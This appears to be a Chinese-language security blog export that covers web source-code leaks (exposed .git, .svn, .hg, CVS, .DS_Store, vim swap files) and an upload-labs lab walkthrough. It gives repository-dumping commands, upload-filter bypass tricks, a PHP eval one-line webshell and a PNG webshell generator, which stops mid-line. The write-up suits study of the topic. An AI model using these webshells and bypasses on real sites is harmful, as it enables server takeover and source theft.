<h1 id="vim临时文件"><a href="#vim临时文件" class="headerlink" title="vim临时文件"></a>vim临时文件</h1><figure class="highlight autohotkey"><table><tr><td class="code"><pre><span class="line">程序员使用vim编辑器编写一个`index.php`文件时，会有一个`.index.php.swp`文件，如果文件正常退出，则该文件被删除，如果异常退出，该文件则会保存下来，该文件可以用来恢复异常退出的index.php，同时多次意外退出并不会覆盖旧的`.swp`文件，而是会生成一个新的，例如`.swo`文件。</span><br></pre></td></tr></table></figure>
<h2 id="恢复文件"><a href="#恢复文件" class="headerlink" title="恢复文件"></a>恢复文件</h2><blockquote>
<p>vim -r  恢复的文件名</p>
<blockquote>
<p> 前提是.index.php.swp存在于该目录下</p>
</blockquote>
</blockquote>
<h1 id="vim备份文件"><a href="#vim备份文件" class="headerlink" title="vim备份文件"></a>vim备份文件</h1><p>默认情况下使用Vim编程，在修改文件后系统会自动生成一个带<code>~</code>的备份文件，某些情况下可以对其下载进行查看；</p>
<blockquote>
<p>以 index.php 为例 第一次产生的缓存文件名为 .index.php.swp<br>第二次意外退出后，文件名为.index.php.swo<br>第三次产生的缓存文件则为 .index.php.swn<br>注意：index前有 “ . “</p>
</blockquote>
<h1 id="PHPSTORM"><a href="#PHPSTORM" class="headerlink" title="PHPSTORM"></a>PHPSTORM</h1><p>使用phpstorm新建项目时，会生成一个<code>.idea</code>文件夹，这个文件夹有一个<code>workspace.xml</code>，访问可以得到一些信息。</p>
<h1 id="网站备份压缩文件"><a href="#网站备份压缩文件" class="headerlink" title="网站备份压缩文件"></a>网站备份压缩文件</h1><p>在网站的使用过程中，往往需要对网站中的文件进行修改、升级。此时就需要对网站整站或者其中某一页面进行备份。当备份文件或者修改过程中的缓存文件因为各种原因而被留在网站web目录下，而该目录又没有设置访问权限时，便有可能导致备份文件或者编辑器的缓存文件被下载，导致敏感信息泄露，给服务器的安全埋下隐患。</p>
<h2 id="漏洞成因及危害"><a href="#漏洞成因及危害" class="headerlink" title="漏洞成因及危害"></a>漏洞成因及危害</h2><p>该漏洞的成因主要有以下两种：</p>
<blockquote>
<p>服务器管理员错误地将网站或者网页的备份文件放置到服务器web目录下。<br>编辑器在使用过程中自动保存的备份文件或者临时文件因为各种原因没有被删除而保存在web目录下。</p>
</blockquote>
<h2 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><p>该漏洞往往会导致服务器整站源代码或者部分页面的源代码被下载，利用。源代码中所包含的各类敏感信息，如服务器数据库连接信息，服务器配置信息等会因此而泄露，造成巨大的损失。被泄露的源代码还可能会被用于代码审计，进一步利用而对整个系统的安全埋下隐患。</p>
<h2 id="常见备份压缩文件"><a href="#常见备份压缩文件" class="headerlink" title="常见备份压缩文件"></a>常见备份压缩文件</h2><blockquote>
<p>.rar<br>.zip<br>.7z<br>.tar.gz<br>.bak<br>.swp<br>.txt<br>.html</p>
</blockquote>
<h2 id="使用disearch扫描"><a href="#使用disearch扫描" class="headerlink" title="使用disearch扫描"></a>使用disearch扫描</h2><blockquote>
<p>python dirsearch.py -u   url  -e *</p>
</blockquote>
<h1 id="git源码泄漏"><a href="#git源码泄漏" class="headerlink" title="git源码泄漏"></a>git源码泄漏</h1><p>git在初始化项目的时候, 会在项目的根目录(可用<code>git rev-parse --show-toplevel</code>查看)创建一个名为<code>.git</code>的隐藏文件夹, 里面包含了本地所有commit的历史记录. 如果无意间将这个目录置于WEB的路径下让用户可以访问,那么这也就泄露了几乎所有的源代码和其他其他敏感信息.</p>
<p>该文件可以来恢复源代码</p>
<h2 id="fuzz："><a href="#fuzz：" class="headerlink" title="fuzz："></a>fuzz：</h2><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//u</span>rl<span class="regexp">/.git/</span>config</span><br></pre></td></tr></table></figure>
<p>若存在该页面，可以看到配置信息，说明存在该漏洞</p>
<h2 id="漏洞利用："><a href="#漏洞利用：" class="headerlink" title="漏洞利用："></a>漏洞利用：</h2><p>工具：<a href="https://github.com/lijiejie/GitHack">GitHack</a></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">python GitHack.py http:<span class="regexp">//u</span>rl<span class="regexp">/.git/</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>git log可以查看提交历史<br>git diff查看git提交的不同处<br>stash命令可用于临时保存和恢复修改，可跨分支<br>git stash list查看所有保存的记录列表<br>git stash pop，从 git 栈中弹出来一个文件</p>
</blockquote>
<p>工具：<a href="https://github.com/kost/dvcs-ripper">dvcs-ripper</a></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">rip-hg.pl -v -u http:<span class="regexp">//u</span>rl/.git</span><br></pre></td></tr></table></figure>


<h1 id="hg泄露"><a href="#hg泄露" class="headerlink" title="hg泄露"></a>hg泄露</h1><p>与git类似, hg在初始化项目时, 会在项目的根目录下创建一个名为<code>.hg</code>的隐藏文件夹,里面包含了代码和分支的修改记录和开发人员的相关信息. 当开发人员使用 Mercurial 进行版本控制，对站点自动部署。如果配置不当,可能会将.hg 文件夹直接部署到线上环境。这就引起了 hg 泄露漏洞。</p>
<p><code>http://www.example.com/.hg/</code></p>
<h2 id="fuzz：-1"><a href="#fuzz：-1" class="headerlink" title="fuzz："></a>fuzz：</h2><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//u</span>rl<span class="regexp">/.hg/</span></span><br></pre></td></tr></table></figure>
<h2 id="漏洞利用：-1"><a href="#漏洞利用：-1" class="headerlink" title="漏洞利用："></a>漏洞利用：</h2><p>工具：<a href="https://github.com/kost/dvcs-ripper">dvcs-ripper</a></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">rip-hg.pl -v -u http:<span class="regexp">//u</span>rl/.hg</span><br></pre></td></tr></table></figure>


<h1 id="SVN泄露"><a href="#SVN泄露" class="headerlink" title="SVN泄露"></a>SVN泄露</h1><p>svn同样在项目根目录下会创建一个名为<code>.svn</code>的隐藏文件夹, 包含了所有分支commit信息和代码记录.</p>
<h2 id="fuzz：-2"><a href="#fuzz：-2" class="headerlink" title="fuzz："></a>fuzz：</h2><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//u</span>rl<span class="regexp">/.svn/</span>entries</span><br></pre></td></tr></table></figure>
<h2 id="漏洞利用：-2"><a href="#漏洞利用：-2" class="headerlink" title="漏洞利用："></a>漏洞利用：</h2><p>工具：<a href="https://github.com/kost/dvcs-ripper">dvcs-ripper</a></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">rip-svn.pl -v -u http:<span class="regexp">//</span>www.example.com<span class="regexp">/.svn/</span></span><br></pre></td></tr></table></figure>


<h1 id="bzr-Bazaar泄露"><a href="#bzr-Bazaar泄露" class="headerlink" title="bzr/Bazaar泄露"></a>bzr/Bazaar泄露</h1><p>bzr在初始化项目时(bzr init/init-repo), 会在项目根目录产生名为<code>.bzr</code>的隐藏目录, 同样暴露了源代码和用户信息.</p>
<h2 id="漏洞利用：-3"><a href="#漏洞利用：-3" class="headerlink" title="漏洞利用："></a>漏洞利用：</h2><p>工具：<a href="https://github.com/kost/dvcs-ripper">dvcs-ripper</a></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">rip-bzr.pl -v -u http:<span class="regexp">//</span>www.example.com<span class="regexp">/.bzr/</span></span><br></pre></td></tr></table></figure>


<h1 id="CVS泄漏"><a href="#CVS泄漏" class="headerlink" title="CVS泄漏"></a>CVS泄漏</h1><p>cvs项目在初始化(cvs checkout <code>project</code>)的时候, 会在<code>project</code>目录下创建一个名为<code>CVS</code>的目录,<br>其中保存了各个文件的修改和commit记录. 通过此目录可以获取代码的历史版本. 其中两个关键文件为:<br><code>CVS/Root</code>和<code>CVS/Entries</code>, 分别记录了项目的根信息和所有文件的结构</p>
<h2 id="fuzz"><a href="#fuzz" class="headerlink" title="fuzz"></a>fuzz</h2><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//u</span>rl<span class="regexp">/CVS/</span>Root 返回根信息</span><br><span class="line">http:<span class="regexp">//u</span>rl<span class="regexp">/CVS/</span>Entries 返回所有文件的结构</span><br></pre></td></tr></table></figure>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>取回源码的命令，这个命令的意思就是把远端一个名为name的repo clone到本地名为dir的目录下。</p>
<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line">bk <span class="keyword">clone</span> <span class="title">http</span>://url/name dir</span><br></pre></td></tr></table></figure>
<p>查看所有的改变的命令，转到download的目录</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">bk changes</span></span><br></pre></td></tr></table></figure>
<h1 id="DS-Store文件泄漏"><a href="#DS-Store文件泄漏" class="headerlink" title=".DS_Store文件泄漏"></a>.DS_Store文件泄漏</h1><p>.DS_Store是Mac下Finder用来保存如何展示 文件/文件夹 的数据文件，每个文件夹下对应一个。如果开发/设计人员在发布代码时未删除文件夹中隐藏的.DS_store，则有可能会造成文件泄露</p>
<h2 id="fuzz：-3"><a href="#fuzz：-3" class="headerlink" title="fuzz："></a>fuzz：</h2><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//u</span>rl/.DS_Store</span><br></pre></td></tr></table></figure>
<h2 id="漏洞利用：-4"><a href="#漏洞利用：-4" class="headerlink" title="漏洞利用："></a>漏洞利用：</h2><p>工具：<a href="https://github.com/lijiejie/ds_store_exp">dsstoreexp</a></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">python ds_store_exp.py http:<span class="regexp">//u</span>rl/.DS_Store</span><br></pre></td></tr></table></figure>


<h1 id="WEB-INF-web-xml泄露"><a href="#WEB-INF-web-xml泄露" class="headerlink" title="WEB-INF/web.xml泄露"></a>WEB-INF/web.xml泄露</h1><p>WEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。</p>
<p>通常一些web应用我们会使用多个web服务器搭配使用，解决其中的一个web服务器的性能缺陷以及做均衡负载的优点和完成一些分层结构的安全策略等。在使用这种架构的时候，由于对静态资源的目录或文件的映射配置不当，可能会引发一些的安全问题，导致web.xml等文件能够被读取。</p>
<p>WEB-INF主要包含一下文件或目录：</p>
<ul>
<li><code>/WEB-INF/web.xml</code>：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。</li>
<li><code>/WEB-INF/classes/</code>：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中</li>
<li><code>/WEB-INF/lib/</code>：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件</li>
<li><code>/WEB-INF/src/</code>：源码目录，按照包名结构放置各个java文件。</li>
<li><code>/WEB-INF/database.properties</code>：数据库配置文件漏洞检测以及利用方法</li>
</ul>
<h2 id="漏洞检测以及利用方法"><a href="#漏洞检测以及利用方法" class="headerlink" title="漏洞检测以及利用方法"></a>漏洞检测以及利用方法</h2><p>通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码。</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//u</span>rl<span class="regexp">/WEB-INF/</span>web.xml</span><br></pre></td></tr></table></figure>
<h1 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h1><p><a href="https://0clickjacking0.github.io/2019/04/17/web%E5%B8%B8%E8%A7%81%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/" target="_blank">https://0clickjacking0.github.io/2019/04/17/web常见源码泄露/</a><br><a href="https://www.secpulse.com/archives/55286.html" target="_blank">https://www.secpulse.com/archives/55286.html</a><br><a href="https://www.cnblogs.com/pannengzhi/p/2017-09-23-web-file-disclosure.html" target="_blank">WEB中的敏感文件泄漏</a></p>
]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title>upload-labs</title>
    <url>/2020/04/16/upload-labs/</url>
    <content><![CDATA[<p>文件上传漏洞<a id="more"></a></p>
<h1 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h1><h2 id="考察点：前端绕过"><a href="#考察点：前端绕过" class="headerlink" title="考察点：前端绕过"></a>考察点：前端绕过</h2><p>发现上传.php文件时，alert:<code>该文件不允许上传，请上传.jpg|.png|.gif,当前文件类型为:php</code>,这表明验证点在前端(js)，而不在服务端.</p>
<p>F12找找js源码，整理如下：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> file = <span class="built_in">document</span>.getElementsByName(<span class="string">&#x27;upload_file&#x27;</span>)[<span class="number">0</span>].value;</span><br><span class="line"><span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">	alert(<span class="string">&quot;请选择要上传的文件!&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//定义允许上传的文件类型</span></span><br><span class="line"><span class="keyword">var</span> allow_ext = <span class="string">&quot;.jpg|.png|.gif&quot;</span>;</span><br><span class="line"><span class="comment">//提取上传文件的类型</span></span><br><span class="line"><span class="keyword">var</span> ext_name = file.substring(file.lastIndexOf(<span class="string">&quot;.&quot;</span>));</span><br><span class="line"><span class="comment">//判断上传文件类型是否允许上传</span></span><br><span class="line"><span class="keyword">if</span> (allow_ext.indexOf(ext_name) == -<span class="number">1</span>) &#123;</span><br><span class="line">	<span class="keyword">var</span> errMsg = <span class="string">&quot;该文件不允许上传，请上传&quot;</span> + allow_ext + <span class="string">&quot;类型的文件,当前文件类型为：&quot;</span> + ext_name;</span><br><span class="line">	alert(errMsg);</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>直接修改js代码或者上传一个有一句话木马<code>&lt;?php @eval($_POST[value]);?&gt;</code>的符合题目后缀要求的文件，抓包修改请求内容绕过，蚁剑链接</p>
<h1 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h1><h2 id="考察点：服务器端MIME绕过"><a href="#考察点：服务器端MIME绕过" class="headerlink" title="考察点：服务器端MIME绕过"></a>考察点：服务器端MIME绕过</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/jpeg&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>) </span><br><span class="line">          || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/gif&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;文件类型不正确，请重新上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH.<span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>很明显对Content-Type进行了检查，抓包更改Content-Type进行绕过即可，上传成功，蚁剑连接</p>
<h1 id="Pass-03"><a href="#Pass-03" class="headerlink" title="Pass-03"></a>Pass-03</h1><h2 id="考察点-黑名单过滤"><a href="#考察点-黑名单过滤" class="headerlink" title="考察点 黑名单过滤"></a>考察点 黑名单过滤</h2><p>上传一个写有<code>AddType application/x-httpd-php .jpg</code>的.htaccess文件，然后再上传一个写有一句话木马的.jpg文件,蚁剑连接。</p>
<p>.htaccess作用：可以把 .jpg后缀格式的文件名以php格式解析，因此达到了可执行的效果</p>
<h1 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h1><h2 id="考察点-htaccess绕过"><a href="#考察点-htaccess绕过" class="headerlink" title="考察点   .htaccess绕过"></a>考察点   .htaccess绕过</h2><p> 同上</p>
<h1 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h1><h2 id="考察点-user-ini"><a href="#考察点-user-ini" class="headerlink" title="考察点  .user.ini"></a>考察点  .user.ini</h2><p>做法类似.htaccess,上传一个写有<code>auto_prepend_file=1.jpg</code>为后缀的.user.ini文件，然后在上传一个写有一句话木马的jpg文件，上传成功后，蚁剑连接，但是要注意，题目提示<code>上传目录存在php文件（readme.php)</code>所以蚁剑连接的时候要把文件名改成readme.php</p>
<h3 id="user-ini作用-所有的php文件都自动包含jpg文件"><a href="#user-ini作用-所有的php文件都自动包含jpg文件" class="headerlink" title=".user.ini作用  所有的php文件都自动包含jpg文件"></a>.user.ini作用  所有的php文件都自动包含jpg文件</h3><h1 id="Pass-06"><a href="#Pass-06" class="headerlink" title="Pass-06"></a>Pass-06</h1><h2 id="考察点-大小写绕过"><a href="#考察点-大小写绕过" class="headerlink" title="考察点 大小写绕过"></a>考察点 大小写绕过</h2><p>看源码，黑名单几乎过滤了所有后缀包括.htaccess，但是发现没有对大小写设置，抓包改下大小写绕过</p>
<h1 id="Pass-07"><a href="#Pass-07" class="headerlink" title="Pass-07"></a>Pass-07</h1><h2 id="考察点-空格绕过"><a href="#考察点-空格绕过" class="headerlink" title="考察点 空格绕过"></a>考察点 空格绕过</h2><p>空格过滤，直接抓包加空格就好了</p>
<h1 id="Pass-08"><a href="#Pass-08" class="headerlink" title="Pass-08"></a>Pass-08</h1><h2 id="考察点-点号绕过"><a href="#考察点-点号绕过" class="headerlink" title="考察点  点号绕过"></a>考察点  点号绕过</h2><p>抓包加点</p>
<h1 id="Pass-09"><a href="#Pass-09" class="headerlink" title="Pass-09"></a>Pass-09</h1><h2 id="考察点-DATA绕过"><a href="#考察点-DATA绕过" class="headerlink" title="考察点   ::$DATA绕过"></a>考察点   ::$DATA绕过</h2><p> ::$DATA作用：php在windows中如果文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持”::$DATA”之前的文件名(Windows文件流特性)</p>
<p>上传一句话木马的.php后缀文件，抓包加::$DATA，上传成功，蚁剑连接（连接的时候要把文件名的::$DATA去掉）</p>
<h1 id="Pass-10"><a href="#Pass-10" class="headerlink" title="Pass-10"></a>Pass-10</h1><h2 id="考察点-空格-绕过"><a href="#考察点-空格-绕过" class="headerlink" title="考察点  .[空格].绕过"></a>考察点  .[空格].绕过</h2><p>注意拼接部分<code>$img_path = UPLOAD_PATH.&#39;/&#39;.$file_name;</code>最后保存的是原始文件，而不是经过检测的文件</p>
<h1 id="Pass-11"><a href="#Pass-11" class="headerlink" title="Pass-11"></a>Pass-11</h1><h2 id="考察点-双写绕过"><a href="#考察点-双写绕过" class="headerlink" title="考察点 双写绕过"></a>考察点 双写绕过</h2><p><code>$file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);</code>很明显是双写绕过，str_ireplace（）函数的作用如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">把字符串 <span class="string">&quot;Hello world!&quot;</span> 中的字符 <span class="string">&quot;WORLD&quot;</span>（不区分大小写）替换成 <span class="string">&quot;Shanghai&quot;</span>：</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> str_ireplace(<span class="string">&quot;WORLD&quot;</span>,<span class="string">&quot;Shanghai&quot;</span>,<span class="string">&quot;Hello world!&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>抓包，把.php后缀改为.pphphp,成功绕过</p>
<h1 id="Pass-12"><a href="#Pass-12" class="headerlink" title="Pass-12"></a>Pass-12</h1><h2 id="考察点-00截断（GET）"><a href="#考察点-00截断（GET）" class="headerlink" title="考察点  00截断（GET）"></a>考察点  00截断（GET）</h2><blockquote>
<p>截断条件：<br>1、php版本小于5.3.4<br>2、php.ini的magic_quotes_gpc为OFF状态</p>
</blockquote>
<p>原理：</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">url</span>中%<span class="number">00</span>表示ascll码中的<span class="number">0</span> ，而ascii中<span class="number">0</span>作为特殊字符保留，表示字符串结束，所以当url中出现%<span class="number">00</span>时就会认为读取已结束</span><br></pre></td></tr></table></figure>
<p>使用情况：</p>
<figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">上传时路径可控，使用<span class="number">00</span>截断</span><br><span class="line">文件下载时，<span class="number">00</span>截断绕过白名单检查</span><br><span class="line">文件包含时，<span class="number">00</span>截断后面限制<span class="comment">(主要是本地包含时)</span></span><br><span class="line">其它与文件操作有关的地方都可能使用<span class="number">00</span>截断。</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$img_path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br></pre></td></tr></table></figure>
<p>构造<code>sava_path=/upload/1.php%00</code>绕过</p>
<h1 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h1><h2 id="考察点-00截断（POST"><a href="#考察点-00截断（POST" class="headerlink" title="考察点  00截断（POST)"></a>考察点  00截断（POST)</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$img_path</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br></pre></td></tr></table></figure>
<p>原理同上，但由于save_path参数通过POST方式传递，而POST不会像GET那样对%00进行自动解码，所以需要在二进制中进行修改  ，将hex改为00</p>
<h1 id="Pass-14"><a href="#Pass-14" class="headerlink" title="Pass-14"></a>Pass-14</h1><h2 id="考察点-图片马上传"><a href="#考察点-图片马上传" class="headerlink" title="考察点  图片马上传"></a>考察点  图片马上传</h2><p>可以将图片带入到PHP代码里，从而导致PHP代码执行</p>
<h3 id="图片马制作"><a href="#图片马制作" class="headerlink" title="图片马制作"></a>图片马制作</h3><p>GIF的文件头GIF89a ,ZIP压缩文件文件头PK   ,7z压缩文件文件头7z</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">法<span class="number">1.</span>创建一个空的.php文件，用notepad++写入GIF89a  <span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[value]);<span class="meta">?&gt;</span></span><br><span class="line">法<span class="number">2.</span>gif后缀文件,用notepad++写入一句话木马</span><br></pre></td></tr></table></figure>
<p>把制作好的图片马上传，打开<code>文件包含漏洞</code>发送GET请求<code>？file=upload/图片文件名</code>，蚁剑连接即可</p>
<h1 id="Pass-15"><a href="#Pass-15" class="headerlink" title="Pass-15"></a>Pass-15</h1><h2 id="考察点-getimagesize"><a href="#考察点-getimagesize" class="headerlink" title="考察点 getimagesize"></a>考察点 getimagesize</h2><p>getimagesize() 函数用于获取图像大小及相关信息，成功返回一个数组，失败则返回 FALSE 并产生一条 E_WARNING 级的错误信息.本关匹配Content-type</p>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line">索引 [<span class="number">2</span>] 给出的是图像的类型，返回的是数字，其中<span class="number">1</span> = GIF，<span class="number">2</span> = <span class="keyword">JPG，3 </span>= PNG，<span class="number">4</span> = <span class="keyword">SWF，5 </span>= PSD，<span class="number">6</span> = <span class="keyword">BMP，7 </span>= TIFF(intel <span class="keyword">byte </span><span class="keyword">order)，8 </span>= TIFF(motorola <span class="keyword">byte </span><span class="keyword">order)，9 </span>= <span class="keyword">JPC，10 </span>= <span class="keyword">JP2，11 </span>= <span class="keyword">JPX，12 </span>= <span class="keyword">JB2，13 </span>= <span class="keyword">SWC，14 </span>= IFF，<span class="number">15</span> = WBMP，<span class="number">16</span> = XBM</span><br></pre></td></tr></table></figure>
<p>做法同Pass-14</p>
<h1 id="Pass-16"><a href="#Pass-16" class="headerlink" title="Pass-16"></a>Pass-16</h1><h2 id="考察点-exif-imagetype"><a href="#考察点-exif-imagetype" class="headerlink" title="考察点 exif_imagetype()"></a>考察点 exif_imagetype()</h2><p> exif_imagetype() 读取一个图像的第一个字节并检查其签名。如果发现了恰当的签名则返回一个对应的常量，否则返回 FALSE。返回值跟getimagesize() 返回的数组中的索引 [2] 的值是一样的</p>
<p>要做这个题首先要把Php扩展php_exif开启</p>
<p>做法同上</p>
<h1 id="Pass-17"><a href="#Pass-17" class="headerlink" title="Pass-17"></a>Pass-17</h1><h2 id="考察点-二次渲染-imagecreatefromjpeg（）"><a href="#考察点-二次渲染-imagecreatefromjpeg（）" class="headerlink" title="考察点 二次渲染  /  imagecreatefromjpeg（）"></a>考察点 二次渲染  /  imagecreatefromjpeg（）</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">imagecreatefromjpeg()会把文件尾部的PHP代码去除，所以本题只需找到渲染前后没有变化的位置(可以用beyond compare进行比较）,然后将一句话php代码写进去，即可上传成功</span><br></pre></td></tr></table></figure>
<p>做法同上</p>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line">下列代码，可以制作一张二次渲染过后，恶意代码依旧存在的png图片马</span><br><span class="line">&lt;?php</span><br><span class="line">//png<span class="number">.</span>php</span><br><span class="line">$p = array(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0xe</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>, <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>, <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>, <span class="number">0x5a</span>, <span class="number">0x1</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x1</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>, <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>, <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>, <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>)<span class="comment">;</span></span><br><span class="line">$img = imagecreatetruecolor(<span class="number">32</span>, <span class="number">32</span>)<span class="comment">;</span></span><br><span class="line">for ($y = <span class="number">0</span><span class="comment">; $y &lt; sizeof($p); $y += 3) &#123;</span></span><br><span class="line">   $r = $p[$y]<span class="comment">;</span></span><br><span class="line">   $g = $p[$y+<span class="number">1</span>]<span class="comment">;</span></span><br><span class="line">   $b = $p[$y+<span class="number">2</span>]<span class="comment">;</span></span><br><span class="line">   $color = imagecolorallocate($img, $r, $g, $b)<span class="comment">;</span></span><br><span class="line">   imagesetpixel($img, round($y / <span class="number">3</span>), <span class="number">0</span>, $color)<span class="comment">;</span></span><br><span class="line">&#125;</span><br><span class="line">imagepng($img,<span 